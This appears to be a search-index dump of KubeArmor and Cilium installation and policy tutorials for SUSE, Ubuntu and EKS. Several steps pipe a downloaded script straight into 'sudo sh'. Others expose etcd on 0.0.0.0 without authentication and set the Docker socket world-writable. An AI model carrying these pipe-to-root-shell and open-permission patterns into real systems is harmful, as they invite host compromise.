Environment=\"ETCD_UNSUPPORTED_ARCH=arm64\"\nLimitNOFILE=65536\nRestart=on-failure\nType=notify\nExecStart=/usr/bin/etcd --config-file /etc/etcd/etcd.conf.yml\nUser=etcd\n\n[Install]\nWantedBy=multi-user.target\n</code></pre> <p>Reload systemd service files with:</p> <pre><code>systemctl daemon-reload\n</code></pre> <p>Enable and Start the etcd service:</p> <pre><code>systemctl enable etcd\n</code></pre> <pre><code>systemctl start etcd\n</code></pre> <pre><code>systemctl status etcd\n</code></pre> <p></p>"},{"location":"open-source/cilium/suse_les_15/#step-2-install-kvm-service-in-control-plane-vm","title":"Step 2: Install KVM-Service in control plane VM","text":"<p>Download the Latest RPM Package</p> <pre><code>wget https://github.com/kubearmor/kvm-service/releases/download/0.1/kvmservice_0.1_linux-amd64.rpm\n</code></pre> <p></p> <pre><code>zypper install kvmservice_0.1_linux-amd64.rpm\n</code></pre> <p></p> <pre><code>systemctl status kvmservice </code></pre> <p></p>"},{"location":"open-source/cilium/suse_les_15/#step-3-install-karmor-in-control-plane-vm","title":"Step 3: Install Karmor in control plane VM","text":"<pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre>"},{"location":"open-source/cilium/suse_les_15/#step-4-onboard-vms-using-karmor","title":"Step 4: Onboard VMs using Karmor","text":"<pre><code>cat kvmpolicy1.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorVirtualMachine\nmetadata:\nname: testvm1\nlabels:\nname: vm1\nvm: true\n</code></pre> <p>Run this command to Add the VM:</p> <pre><code>karmor vm add kvmpolicy1.yaml\n</code></pre> <p></p> <p>To see the onboarded VM\u2019s</p> <pre><code>karmor vm list\n</code></pre> <p></p>"},{"location":"open-source/cilium/suse_les_15/#step-5-generate-installation-scripts-for-configured-worker-vms","title":"Step 5: Generate Installation scripts for configured worker VMs","text":"<p>Generate VM installation scripts for the configured VM by running the following command:</p> <pre><code>karmor vm --kvms getscript -v testvm1\n</code></pre> <p></p>"},{"location":"open-source/cilium/suse_les_15/#step-6-execute-the-installation-script-in-vms","title":"Step 6: Execute the Installation script in VMs","text":"<p>Note: Docker needs to Install before running the script.</p> <pre><code>vi testvm1.sh\n</code></pre> <p>Comment the following line on script and save it:</p> <pre><code>#sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE $KUBEARMOR_OPTS\n</code></pre> <p></p> <p>Note: Upcoming release will fix the above comment section.</p> <p>Execute the Installation script:</p> <p>Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium.</p> <p>The script downloads Cilium Docker images and run them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies.</p> <p>Execute the script on worker VM  by running the following command:</p> <pre><code>./testvm1.sh\n</code></pre> <p></p> <p>Note: Make sure the KVM-Service is running on control plane VM &amp; To onboard more worker VM repeat Step 4, Step 5 &amp; Step 6.</p> <p>You can verify by running following command:</p> <pre><code>sudo docker ps\n</code></pre> <p></p>"},{"location":"open-source/cilium/suse_les_15/#step-7-apply-and-verify-cilium-network-policy","title":"Step 7: Apply and Verify Cilium network policy","text":"<p>1. Allow connectivity with the control plane ( and port 2379) <pre><code>cat vm-allow-control-plane.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-control-plane\"\nspec:\ndescription: \"Policy to allow traffic to kv-store\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toCIDR:\n- 10.138.0.5/32\ntoPorts:\n- ports:\n- port: \"2379\"\nprotocol: TCP\n</code></pre> <p>2. For SSH connectivity allow port 22 and 169.254.169.254 port 80</p> <pre><code>cat vm-allow-ssh.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-ssh\"\nspec:\ndescription: \"Policy to allow SSH\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"22\"\nprotocol: TCP\n- toCIDR:\n- 169.254.169.254/32\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n</code></pre> <p>3. This policy block the DNS access in VM</p> <pre><code>cat vm-dns-visibility.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-dns-visibility\"\nspec:\ndescription: \"Policy to enable DNS visibility\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"53\"\nprotocol: ANY\nrules:\ndns:\n- matchPattern: \"*\"\n</code></pre> <p>4. This policy allow access of \u201cwww.google.co.in\u201d alone in VM</p> <pre><code>cat vm-allow-www-google-co-in.yaml </code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-www.google.co.in\"\nspec:\ndescription: \"Policy to allow traffic to www.google.co.in\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toFQDNs:\n- matchName: www.google.co.in\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n- port: \"443\"\nprotocol: TCP\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm --kvms policy add vm-allow-control-plane.yaml\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-ssh.yaml </code></pre> <pre><code>karmor vm --kvms policy add vm-dns-visibility.yaml\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-www-google-co-in.yaml\n</code></pre> <p></p>"},{"location":"open-source/cilium/suse_les_15/#step-8-policy-violation-on-worker-node","title":"Step 8: Policy Violation on worker node","text":"<pre><code>curl http://www.google.co.in/\n</code></pre> <pre><code>curl https://go.dev/\n</code></pre> <p>Verifying policy Violation logs:</p> <pre><code>docker exec -it cilium hubble observe -f -t policy-verdict\n</code></pre> <p></p>"},{"location":"open-source/cilium/ubuntu18.04/","title":"Ubuntu 18.04","text":""},{"location":"open-source/cilium/ubuntu18.04/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Cilium on Ubuntu 18.04 with 5.4 Kernel Version by applying policies on VM workloads.</p>"},{"location":"open-source/cilium/ubuntu18.04/#step-1-install-etcd-in-control-plane-vm","title":"Step 1: Install etcd in control plane VM","text":"<pre><code>sudo apt-get install etcd\n</code></pre> <p>Once etcd installed, configure the following values in /etc/default/etcd as shown below.</p> <pre><code>ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379\nETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379\n</code></pre> <p>Restart and check the status of etcd:</p> <pre><code>sudo service etcd restart\n</code></pre> <pre><code>sudo service etcd enable\n</code></pre> <pre><code>sudo service etcd status\n</code></pre> <p></p>"},{"location":"open-source/cilium/ubuntu18.04/#step-2-install-kvm-service-in-control-plane","title":"Step 2: Install KVM-Service in control plane","text":"<p>Pre-requisites: Download and Install Go</p> <p>Visit Go Website for Latest Version</p> <pre><code>wget https://go.dev/dl/go1.18.1.linux-amd64.tar.gz\n</code></pre> <p>Untar file:</p> <pre><code>rm -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.18.1.linux-amd64.tar.gz\n</code></pre> <pre><code>vim /etc/profile </code></pre> <p>Paste the below path in /etc/profile:</p> <pre><code>export PATH=$PATH:/usr/local/go/bin\n</code></pre> <p>Run the following command:</p> <pre><code>source /etc/profile </code></pre> <p>Clone KVM-Service code and checkout to non-k8s branch:</p> <pre><code>sudo git clone https://github.com/kubearmor/kvm-service.git\n</code></pre> <p></p> <pre><code>cd /kvm-service/\n</code></pre> <pre><code>sudo git checkout non-k8s\n</code></pre> <p></p> <p>Navigate to kvm-service/src/service/ and execute the following command to compile KVM-Service code:</p> <pre><code>make\n</code></pre> <p></p> <p></p> <p>Once compilation is successful, run KVM-Service using the following command:</p> <pre><code>sudo ./kvmservice --non-k8s 2&gt; /dev/null\n</code></pre> <p></p> <p>Note: Let keep it running and continue in new terminal.</p>"},{"location":"open-source/cilium/ubuntu18.04/#step-3-install-karmor-in-control-plane","title":"Step 3: Install Karmor in control plane","text":"<p>Run the following command to Install Karmor utility:</p> <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> <p></p>"},{"location":"open-source/cilium/ubuntu18.04/#step-4-onboard-vms-using-karmor","title":"Step 4: Onboard VMs using Karmor","text":"<pre><code>vim kvmpolicy1.yaml\n</code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorVirtualMachine\nmetadata:\nname: testvm1\nlabels:\nname: vm1\nvm: true\n</code></pre> <p>Run this command:</p> <pre><code>karmor vm add kvmpolicy1.yaml\n</code></pre> <p></p> <p>When a new VM is onboarded, the KVM-Service assigns a new identity to it. To see the list of onboarded VMs, execute the following command.</p> <pre><code>karmor vm list\n</code></pre> <p></p>"},{"location":"open-source/cilium/ubuntu18.04/#step-5-generate-installation-scripts-for-configured-vm","title":"Step 5: Generate Installation scripts for configured VM","text":"<pre><code>karmor vm --kvms getscript -v testvm1\n</code></pre> <p>Output:</p> <p>VM installation script copied to testvm1.sh</p> <p></p>"},{"location":"open-source/cilium/ubuntu18.04/#step-6-execute-the-installation-script-in-docker-installed-vm","title":"Step 6: Execute the Installation script in Docker Installed VM","text":"<p>Install Docker:</p> <pre><code>sudo apt-get update\n</code></pre> <pre><code>sudo apt install docker.io\n</code></pre> <pre><code>sudo systemctl start docker\n</code></pre> <pre><code>sudo systemctl enable docker\n</code></pre> <pre><code>sudo systemctl status docker\n</code></pre> <p></p> <p>Comment the following line on the script and save it:</p> <pre><code>vi testvm1\n</code></pre> <pre><code>#sudo docker run --name kubearmor $DOCKER_OPTS $KUBEARMOR_IMAGE      $KUBEARMOR_OPTS\n</code></pre> <p></p> <p>Execute the Installation script:</p> <p>Copy the generated installation scripts to appropriate VMs using scp or rsync method and execute the scripts to run Cilium.</p> <p>The script downloads Cilium Docker images and runs them as containers in each VM. Cilium running in each VM connects to the KVM-Service control plane to register themselves and receive information about other VMs in the cluster, labels, IPs and configured security policies.</p> <p>Execute the script on worker VM by running the following commands:</p> <pre><code>sudo su -\n</code></pre> <pre><code>chmod 777 testvm1.sh\n</code></pre> <pre><code>./testvm1.sh\n</code></pre> <p></p> <p>Note: Make sure the kvm-service is running on control plane VM &amp; To onboard more worker VM repeat Step 6, Step 7 &amp; Step 8.</p> <p>You can Verify by running following command,</p> <pre><code>docker ps\n</code></pre> <p></p>"},{"location":"open-source/cilium/ubuntu18.04/#step-7-apply-and-verify-cilium-network-policy","title":"Step 7: Apply and Verify Cilium network policy","text":"<pre><code>vim port80-allow.yaml\n</code></pre> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: \"vm1-allow-http\"\nspec:\ndescription: \"L4 policy to allow traffic at port 80/TCP\"\nnodeSelector:\nmatchLabels:\nname: vm1\ningress:\n- toPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n</code></pre> <p>Run this command to apply the policy:</p> <pre><code>karmor vm --kvms policy add port80-allow.yaml\n</code></pre> <p></p> <p>Note: The policy says.. \"ingress, port 80/TCP\". This will allow ingress connection to the specified port/protocol. Anything other than that will be denied.</p>"},{"location":"open-source/cilium/ubuntu18.04/#step-8-violating-the-policy","title":"Step 8: Violating the policy","text":"<p>Output : Unable to SSH the VM via 22 port</p> <p>Deleting the applied policy:</p> <pre><code>karmor vm --kvms policy delete port80-allow.yaml\n</code></pre> <p></p> <p>Output : Now able to do SSH</p>"},{"location":"open-source/cilium/ubuntu20.04/","title":"Ubuntu 20.04","text":""},{"location":"open-source/cilium/ubuntu20.04/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Cilium on Ubuntu 20.04 with 5.13 Kernel Version by applying policies on VM workloads.</p>"},{"location":"open-source/cilium/ubuntu20.04/#step-1-install-etcd-in-control-plane-vm","title":"Step 1: Install etcd in control plane VM","text":"<pre><code>sudo su\n</code></pre> <pre><code>apt update\n</code></pre> <pre><code>apt-get install etcd\n</code></pre> <p>Once etcd installed, configure the following values in /etc/default/etcd as shown below.</p> <pre><code>vim /etc/default/etcd\n</code></pre> <pre><code>ETCD_LISTEN_CLIENT_URLS=http://0.0.0.0:2379\nETCD_ADVERTISE_CLIENT_URLS=http://0.0.0.0:2379\n</code></pre> <p>Restart and Check the status of etcd:</p> <pre><code>service etcd restart\n</code></pre> <pre><code>service etcd status\n</code></pre> <pre><code>service etcd enable\n</code></pre> <p></p>"},{"location":"open-source/cilium/ubuntu20.04/#step-2-installing-bcc","title":"Step 2: Installing BCC","text":"<pre><code>apt install -y bison build-essential cmake flex git libedit-dev \\\n&gt;   libllvm7 llvm-7-dev libclang-7-dev python zlib1g-dev libelf-dev libfl-dev python3-distutils\n</code></pre> <pre><code>git clone --depth 1 --branch v0.24.0 https://github.com/iovisor/bcc.git\n</code></pre> <pre><code>mkdir bcc/build; cd bcc/build\n</code></pre> <pre><code>cmake ..\n</code></pre> <pre><code>make\n</code></pre> <pre><code>make install\n</code></pre> <pre><code>cmake -DPYTHON_CMD=python3 ..\n</code></pre> <pre><code>pushd src/python/ &amp;&amp; make\n</code></pre> <pre><code>make install\n</code></pre>"},{"location":"open-source/cilium/ubuntu20.04/#step-3-install-kvm-service-in-control-plane","title":"Step 3: Install KVM-Service in control plane","text":"<p>Pre-requisites: Download &amp; Install Go</p> <p>Visit Go website for latest version</p> <pre><code>wget https://go.dev/dl/go1.18.1.linux-amd64.tar.gz\n</code></pre> <p>Untar file:</p> <pre><code>rm -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.18.1.linux-amd64.tar.gz\n</code></pre> <pre><code>vim /etc/profile </code></pre> <p>Paste the below path in /etc/profile:</p> <pre><code>export PATH=$PATH:/usr/local/go/bin\n</code></pre> <p>Run the following command:</p> <pre><code>source /etc/profile </code></pre> <p>Note: KVM-Service requires that all the managed VMs should be within the same network.</p> <pre><code>git clone https://github.com/kubearmor/kvm-service.git </code></pre> <pre><code>cd kvm-service &amp;&amp; git checkout non-k8s </code></pre> <pre><code>cd src/service/ &amp;&amp; make </code></pre> <pre><code>./kvmservice --non-k8s 2&gt; /dev/null  </code></pre> <p></p> <p>Note: Let it keep running &amp; continue in new terminal.</p>"},{"location":"open-source/cilium/ubuntu20.04/#step-4-install-karmor-in-control-plane","title":"Step 4: Install Karmor in control plane","text":"<pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre>"},{"location":"open-source/cilium/ubuntu20.04/#step-5-onboard-vms-using-karmor","title":"Step 5: Onboard VMs using Karmor","text":"<pre><code>cat kvmpolicy1.yaml\n</code></pre> <pre><code>karmor vm add kvmpolicy1.yaml\n</code></pre> <pre><code>karmor vm list\n</code></pre>"},{"location":"open-source/cilium/ubuntu20.04/#step-6-generate-installation-scripts-for-configured-vm","title":"Step 6: Generate Installation scripts for configured VM","text":"<pre><code>karmor vm --kvms getscript -v testvm1\n</code></pre>"},{"location":"open-source/cilium/ubuntu20.04/#step-7-execute-the-installation-script-in-vm","title":"Step 7: Execute the Installation script in VM","text":"<pre><code>sudo su </code></pre> <pre><code>apt update\n</code></pre> <p>Note: Docker needs to be Installed before runing the script. </p> <pre><code>apt install docker.io\n</code></pre> <pre><code>chmod 666 /var/run/docker.sock\n</code></pre> <p>Copy the Generated Installation scripts to appropriate VM: </p> <pre><code>scp -r testvm1.sh [root@IP:/path]\n</code></pre> <pre><code>chmod +x testvm1.sh\n</code></pre> <pre><code>./testvm1.sh </code></pre> <pre><code>docker ps\n</code></pre> <p></p>"},{"location":"open-source/cilium/ubuntu20.04/#step-8-apply-and-verify-cilium-network-policy","title":"Step 8: Apply and Verify Cilium network policy","text":"<p>1. Allow connectivity with the control plane ( and port 2379) <pre><code>vim vm-allow-control-plane.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-control-plane\"\nspec:\ndescription: \"Policy to allow traffic to kv-store\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toCIDR:\n- 10.128.0.6/32\ntoPorts:\n- ports:\n- port: \"2379\"\nprotocol: TCP\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-control-plane.yaml\n</code></pre> <p></p> <p>Note: With the above mentioned policy enforced in the VM, a user cannot access any port of the vm. SSH connection of port22 gets an error connection refused .</p> <p></p> <p>2. For SSH connectivity allow port 22 and 169.254.169.254 port 80</p> <pre><code>vim vm-allow-ssh.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-ssh\"\nspec:\ndescription: \"Policy to allow SSH\"\nnodeSelector:\nmatchLabels:\nname: vm1\ningress:\n- toPorts:\n- ports:\n- port: \"22\"\nprotocol: TCP\n- toCIDR:\n- 169.254.169.254/32\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\negress:\n- fromCIDR:\n- 169.254.169.254/32\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-ssh.yaml\n</code></pre> <p></p> <p>3. This policy allow DNS access in VM</p> <pre><code>vim vm-dns-visibility.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-dns-visibility\"\nspec:\ndescription: \"Policy to enable DNS visibility\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toPorts:\n- ports:\n- port: \"53\"\nprotocol: ANY\nrules:\ndns:\n- matchPattern: \"*\"\n</code></pre> <pre><code>karmor vm --kvms policy add vm-dns-visibility.yaml </code></pre> <p></p> <p>4. This policy allow access of \u201cwww.google.co.in\u201d alone in VM</p> <pre><code>vim vm-allow-www-google-co-in.yaml\n</code></pre> <pre><code>kind: CiliumNetworkPolicy\nmetadata:\nname: \"vm-allow-www.google.co.in\"\nspec:\ndescription: \"Policy to allow traffic to www.google.co.in\"\nnodeSelector:\nmatchLabels:\nname: vm1\negress:\n- toFQDNs:\n- matchName: www.google.co.in\ntoPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\n- port: \"443\"\nprotocol: TCP\n</code></pre> <pre><code>karmor vm --kvms policy add vm-allow-www-google-co-in.yaml\n</code></pre> <p></p>"},{"location":"open-source/cilium/ubuntu20.04/#step-9-violating-the-policy","title":"Step 9: Violating the Policy*","text":"<pre><code>curl http://www.google.co.in/\n</code></pre> <pre><code>curl https://go.dev/\n</code></pre> <p>Verifying policy Violation logs: </p> <pre><code>docker exec -it cilium hubble observe -f -t policy-verdict\n</code></pre> <p></p>"},{"location":"open-source/cilium/eks_al2/eksal2/","title":"EKS Amazon Linux 2","text":""},{"location":"open-source/cilium/eks_al2/eksal2/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Cilium on EKS Amazon Linux 2 by applying policies on Kubernetes workloads.</p>"},{"location":"open-source/cilium/eks_al2/eksal2/#step-1-create-a-eks-cluster-using-aws-console","title":"Step 1: Create a EKS-cluster using AWS console","text":"<p>Once the nodegroup is created, Install EKS CTL, AWS CLI, Helm tools</p> <p></p> <pre><code>eksctl get cluster\n</code></pre> <pre><code>aws eks --region us-west-1 update-kubeconfig --name eks-amazon-cilium\n</code></pre> <p></p> <pre><code>kubectl get nodes\n</code></pre> <pre><code>kubectl get svc\n</code></pre> <p></p>"},{"location":"open-source/cilium/eks_al2/eksal2/#step-2-cilium-install","title":"Step 2: Cilium Install","text":"<p>Install Cilium CLI:</p> <pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-\nlinux-amd64.tar.gz{,.sha256sum}\n</code></pre> <pre><code>sha256sum --check cilium-linux-amd64.tar.gz.sha256sum\n</code></pre> <pre><code>sudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\n</code></pre> <pre><code>rm cilium-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <p></p> <p>Note: Cilium will Install in EKS, you have to pass a valid auto-detected cluster name. Remember the value of cluster name should only contain alphanumeric lowercase characters and hyphen symbols. for instance, If your auto detected cluster name is arn:aws:eks:us-west-1:199488642388:cluster/eks-amazon-cilium, then pass the value as arn-aws-eks-us-west-1-199488642388-cluster-eks-amazon-cilium.</p> <pre><code>cilium install --cluster-name arn-aws-eks-us-west-1-199488642388-cluster-eks-amazon-cilium\n</code></pre> <p></p> <p>Cilium Verify:</p> <pre><code>kubectl get pods -n kube-system | grep cilium\n</code></pre> <p></p> <p>Cilium Hubble Enable:</p> <pre><code>cilium hubble enable\n</code></pre> <p></p> <p>Cilium Verify:</p> <pre><code>kubectl get pods -n kube-system | grep hubble\n</code></pre> <p></p> <pre><code>cilium status </code></pre> <p></p> <p>Install the Hubble CLI Client:</p> <pre><code>export HUBBLE_VERSION=$(curl -s https://raw.githubusercontent.com/cilium/hubble/master/stable.txt)\n</code></pre> <pre><code>curl -L --remote-name-all https://github.com/cilium/hubble/releases/download/$HUBBLE_VERSION/hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre> <p></p> <pre><code>sha256sum --check hubble-linux-amd64.tar.gz.sha256sum\n</code></pre> <p></p> <pre><code>tar xzvfC hubble-linux-amd64.tar.gz /usr/local/bin\n</code></pre> <p></p> <pre><code>rm hubble-linux-amd64.tar.gz{,.sha256sum}\n</code></pre>"},{"location":"open-source/cilium/eks_al2/eksal2/#step-3-cilium-policy","title":"Step 3: Cilium Policy","text":"<p>1. Create a tightfighter and deathstart deployment and verify it</p> <pre><code>cat tightfighter-deathstart-app.yaml\n</code></pre> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\ntype: ClusterIP\nports:\n- port: 80\nselector:\norg: empire\nclass: deathstar\n---\napiVersion: v1\nkind: Service\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\ntype: ClusterIP\nports:\n- port: 80\nselector:\norg: empire\nclass: deathstar\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\nreplicas: 2\nselector:\nmatchLabels:\norg: empire\nclass: deathstar\ntemplate:\nmetadata:\nlabels:\norg: empire\nclass: deathstar\napp.kubernetes.io/name: deathstar\nspec:\ncontainers:\n- name: deathstar\nimage: docker.io/cilium/starwars\n</code></pre> <pre><code>---\napiVersion: v1\nkind: Pod\nmetadata:\nname: tiefighter\nlabels:\norg: empire\nclass: tiefighter\napp.kubernetes.io/name: tiefighter\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n---\napiVersion: v1\nkind: Pod\nmetadata:\nname: xwing\nlabels:\napp.kubernetes.io/name: xwing\norg: alliance\nclass: xwing\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n</code></pre> <pre><code>kubectl apply -f tightfighter-deathstart-app.yaml\n</code></pre> <p></p> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Explore the policy</p> <pre><code>cat sample-cilium-ingress-policy.yaml\n</code></pre> <pre><code>apiVersion: \"cilium.io/v2\"\nkind: CiliumNetworkPolicy\nmetadata:\nname: \"rule1-ingress\"\nspec:\ndescription: \"L7 policy to restrict access to specific HTTP call\"\nendpointSelector:\nmatchLabels:\nclass: deathstar\ningress:\n- toPorts:\n- ports:\n- port: \"80\"\nprotocol: TCP\nrules:\nhttp:\n- method: \"POST\"\npath: \"/v1/request-landing\"\n</code></pre> <p></p> <p>3. Apply the policy</p> <pre><code>kubectl apply -f sample-cilium-ingress-policy.yaml\n</code></pre> <p></p> <p>4. Violating the policy</p> <pre><code>kubectl get svc\n</code></pre> <p></p> <pre><code>kubectl exec -n default tiefighter -- curl -s -XPOST 10.100.98.131/v1/request-landing\n</code></pre> <p></p> <pre><code>kubectl exec -n default tiefighter -- curl -s -XPOST 10.100.98.131/v1/test\n</code></pre> <p></p> <p>Getting Alerts/Telemetry from Cilium:</p> <pre><code>cilium hubble port-forward\n</code></pre> <p></p> <p>5. Monitoring the Cilium Violation Logs</p> <pre><code>hubble observe --pod tiefighter --protocol http </code></pre> <p></p>"},{"location":"open-source/eks/eks/","title":"Eks","text":""},{"location":"open-source/eks/eks/#overview","title":"Overview","text":"<p>This user journey guides you to install and verify the compatibility of Kuberarmor and Cilium on EKS Ubuntu Server 20.04 by applying policies on kubernetes workloads.</p>"},{"location":"open-source/eks/eks/#step-1-create-a-eks-cluster","title":"Step 1: Create a EKS Cluster","text":"<p>Install EKS CTL, AWS CLI, Helm tools</p> <pre><code>cat eks-config.yaml </code></pre> <pre><code>apiVersion: eksctl.io/v1alpha5\nkind: ClusterConfig\nmetadata:\nname: eks-ubuntu-cluster\nregion: us-east-2\nnodeGroups:\n- name: ng-1\ninstanceType: c5a.xlarge\namiFamily: \"Ubuntu2004\"\ndesiredCapacity: 1\nvolumeSize: 80\nssh:\nallow: true\npreBootstrapCommands:\n- \"sudo apt install linux-headers-$(uname -r)\"\n</code></pre> <p>Official Link: Sample eks-config.yaml</p> <p>Note:</p> <p>EKS suported image types:  </p> <ul> <li> <p>Amazon Linux 2</p> </li> <li> <p>Ubuntu 20.04 </p> </li> <li> <p>Ubuntu 18.04</p> </li> <li> <p>Bottlerocket</p> </li> <li> <p>Windows Server 2019 Core Container </p> </li> <li> <p>Windows Server 2019 Full Container </p> </li> <li> <p>Windows Server 2004 Core Container</p> </li> <li> <p>Windows Server 20H2 Core Container</p> </li> </ul> <pre><code>eksctl create cluster -f eks-config.yaml\n</code></pre> <p></p> <pre><code>aws eks --region us-east-2 update-kubeconfig --name eks-ubuntu-cluster\n</code></pre> <p></p>"},{"location":"open-source/eks/eks/#step-2-karmor-install","title":"Step 2: Karmor Install","text":"<p>Install Karmor CLI:</p> <pre><code>curl -sfL https://raw.githubusercontent.com/kubearmor/kubearmor-client/main/install.sh | sudo sh -s -- -b /usr/local/bin\n</code></pre> <pre><code>karmor version\n</code></pre> <pre><code>karmor install  </code></pre> <p></p> <p>Karmor Verify:</p> <pre><code>kubectl get pods -n kube-system | grep kubearmor\n</code></pre> <p></p>"},{"location":"open-source/eks/eks/#step-3-cilium-install","title":"Step 3: Cilium Install","text":"<pre><code>curl -L --remote-name-all https://github.com/cilium/cilium-cli/releases/latest/download/cilium-linux-amd64.tar.gz{,.sha256sum}\nsha256sum --check cilium-linux-amd64.tar.gz.sha256sum\nsudo tar xzvfC cilium-linux-amd64.tar.gz /usr/local/bin\nrm cilium-linux-amd64.tar.gz{,.sha256sum}\ncilium install </code></pre> <p>Cilium Verify:</p> <pre><code>kubectl get pods -n kube-system | grep cilium </code></pre> <p></p> <p>Cilium Hubble Enable:</p> <pre><code>cilium hubble enable\n</code></pre> <p></p> <p>Cilium Hubble Verify:</p> <pre><code>kubectl get pods -n kube-system | grep hubble\n</code></pre> <p></p>"},{"location":"open-source/eks/eks/#step-4-kubearmor-policy","title":"Step 4: Kubearmor Policy","text":"<p>1. Create a nginx deployment</p> <pre><code>kubectl create deployment nginx --image nginx\n</code></pre> <pre><code>kubectl get pods --show-labels\n</code></pre> <p></p> <p>2. Explore the policy</p> <pre><code>cat nginx-kubearmor-policy.yaml </code></pre> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: nginx-kubearmor-policy\n# namespace: accuknox-agents # Change your namespace\nspec:\ntags: [\"MITRE\", \"T1082\"]\nmessage: \"System owner discovery command is blocked\"\nselector:\nmatchLabels:\napp: nginx # use your own label here\nprocess:\nseverity: 3\nmatchPaths:\n- path: /usr/bin/who\n- path: /usr/bin/w\n- path: /usr/bin/id\n- path: /usr/bin/whoami\naction: Block\n</code></pre> <p></p> <p>3. Apply the policy</p> <p><pre><code>kubectl apply -f nginx-kubearmor-policy.yaml  </code></pre> </p> <p>Note: Policy will work based on matched lables.  Ex: (app: nginx)</p> <p>4. Policy violation</p> <pre><code>kubectl exec -it nginx-766b69bd4b-8jttd -- bash  </code></pre> <p></p> <p>5. Kubearmor SVC port forward to Monitor the logs</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor --address 0.0.0.0 --address :: 32767:32767\n</code></pre> <p></p> <p>6. Verifying policy Violation logs</p> <pre><code>karmor log\n</code></pre> <p></p> <p></p>"},{"location":"open-source/eks/eks/#step-5-cilium-policy","title":"Step 5: Cilium Policy","text":"<p>1. Create a tightfighter and deathstart deployment</p> <pre><code>cat tightfighter-deathstart-app.yaml\n</code></pre> <pre><code>apiVersion: v1\nkind: Service\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\ntype: ClusterIP\nports:\n- port: 80\nselector:\norg: empire\nclass: deathstar\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\nname: deathstar\nlabels:\napp.kubernetes.io/name: deathstar\nspec:\nreplicas: 2\nselector:\nmatchLabels:\norg: empire\nclass: deathstar\ntemplate:\nmetadata:\nlabels:\norg: empire\nclass: deathstar\napp.kubernetes.io/name: deathstar\nspec:\ncontainers:\n- name: deathstar\nimage: docker.io/cilium/starwars\n---\napiVersion: v1\nkind: Pod\nmetadata:\nname: tiefighter\nlabels:\norg: empire\nclass: tiefighter\napp.kubernetes.io/name: tiefighter\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n---\napiVersion: v1\nkind: Pod\nmetadata:\nname: xwing\nlabels:\napp.kubernetes.io/name: xwing\norg: alliance\nclass: xwing\nspec:\ncontainers:\n- name: spaceship\nimage: docker.io/tgraf/netperf\n</code></pre> <pre><code>kubectl apply -f tightfighter-deathstart-app.yaml 